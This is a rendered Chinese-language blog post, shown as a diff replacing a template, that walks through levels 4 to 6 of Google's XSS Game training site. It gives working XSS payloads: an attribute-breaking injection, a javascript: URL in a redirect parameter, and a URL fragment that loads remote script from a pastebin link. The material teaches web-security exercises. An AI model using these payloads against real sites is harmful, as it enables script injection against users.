@@ -1,20 +1,20 @@
-extends partial/layout
-
-block site_title
-    != page.title + " · " + config.title
-
-block description
-    - var desc = page.desc || page.title + ' - ' + config.author;
-    meta(name="description", content=desc)
-
-block container
-    include mixins/post
-    +post(page)
-
-block pagination
-    include mixins/paginator
-    +post()
-    include partial/comment
-
-block copyright
-    include partial/copyright
+<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> Googles XSS Game · Colorjam's Blog</title><meta name="description" content="Googles XSS Game - Colorjam"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/favicon.png"><link rel="stylesheet" href="/css/apollo.css"><link rel="search" type="application/opensearchdescription+xml" href="http://yoursite.com/atom.xml" title="Colorjam's Blog"></head><body><div class="wrap"><header><a href="/" class="logo-link"><img src="/favicon.png" alt="logo"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">BLOG</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">ARCHIVE</a></li><li class="nav-list-item"><a href="http://weibo.com/pinkladies" target="_blank" class="nav-list-link">WEIBO</a></li><li class="nav-list-item"><a href="/atom.xml" target="_self" class="nav-list-link">RSS</a></li></ul></header><main class="container"><div class="post"><article class="post-block"><h1 class="post-title">Googles XSS Game</h1><div class="post-info">Oct 14, 2017</div><div class="post-content"><p>前面三关没有想起来要记录 // 尴尬.jpg  </p>
+<p>懒得再回去敲一遍了，让我们直接从Level4开始你的表演吧！</p>
+<h2 id="Level-4"><a href="#Level-4" class="headerlink" title="Level 4"></a>Level 4</h2><p><img src="D:\5_Front-End\blog\source\images\20170320 level4_1.png" alt="20170320 level4_1"></p>
+<p>检查了一下源代码发现上面加载的图片有猫腻</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"/static/loading.gif"</span> <span class="attr">onload</span>=<span class="string">"startTimer('&#123;&#123; timer &#125;&#125;');"</span> /&gt;</span></div></pre></td></tr></table></figure>
+<p>于是就想到在onload里面直接执行alert</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="string">'); alert('</span>hello<span class="string">');""('</span></div></pre></td></tr></table></figure>
+<p><img src="D:\5_Front-End\blog\source\images\20170320level4_2.png" alt="20170320level4_2"></p>
+<h2 id="Level-5"><a href="#Level-5" class="headerlink" title="Level 5"></a>Level 5</h2><p>点击signup跳转至如下页面</p>
+<p><img src="D:\5_Front-End\blog\source\images\20170320 level5_1.png" alt="20170320 level5_1"></p>
+<p>随便输入几个字母，Next &gt;&gt; 跳回注册页面</p>
+<p>这时候F12查看源代码，有一句注释</p>
+<p><img src="D:\5_Front-End\blog\source\images\20170320level5_3.png" alt="20170320level5_3"></p>
+<p>好的，这下I know了</p>
+<p>然后发现 window.location 的 next=cofirm 嗯有猫腻，那我改一下</p>
+<p>直接把 next=cofrim 改成 next=javascript:alert(‘hello’); 完美！</p>
+<h2 id="Level6"><a href="#Level6" class="headerlink" title="Level6"></a>Level6</h2><p><img src="D:\5_Front-End\blog\source\images\20170320 level6.png" alt="20170320 level6"></p>
+<p>羞愧偷了一下别人的代码&gt;&lt; </p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https:<span class="comment">//xss-game.appspot.com/level6/frame#htTps://pastebin.com/raw.php?i=15S5qZs0</span></div></pre></td></tr></table></figure>
+</div></article></div></main><footer><div class="paginator"><a href="/2017/10/14/看看共享单车吧/" class="next">NEXT</a></div><div class="copyright"><p>© 2015 - 2017 <a href="http://yoursite.com">Colorjam</a>, powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/pinggod/hexo-theme-apollo" target="_blank">hexo-theme-apollo</a>.</p></div></footer></div><cript async src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML"></cript><script>(function(b,o,i,l,e,r){b.GoogleAnalyticsObject=l;b[l]||(b[l]=function(){(b[l].q=b[l].q||[]).push(arguments)});b[l].l=+new Date;e=o.createElement(i);r=o.getElementsByTagName(i)[0];e.src='//www.google-analytics.com/analytics.js';r.parentNode.insertBefore(e,r)}(window,document,'script','ga'));ga('create',"UA-65933410-1",'auto');ga('send','pageview');</script></body></html>
